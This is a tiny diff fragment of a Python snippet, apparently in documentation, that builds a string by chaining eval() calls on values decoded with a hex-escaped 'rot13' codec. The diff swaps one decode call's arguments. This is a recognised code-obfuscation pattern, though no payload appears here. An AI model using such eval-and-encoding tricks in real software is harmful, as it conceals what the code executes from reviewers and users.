@@ -81,7 +81,7 @@ encode = '\x72\x6f\x74\x31\x33'
 ```python
 code = \
     eval(this) + \
-    eval(codecs.decode(an, is_)) + \
+    eval(codecs.decode(is_, encode)) + \
     eval(an) + \
     eval(codecs.decode(simple, encode)) + \
     eval(python) + \
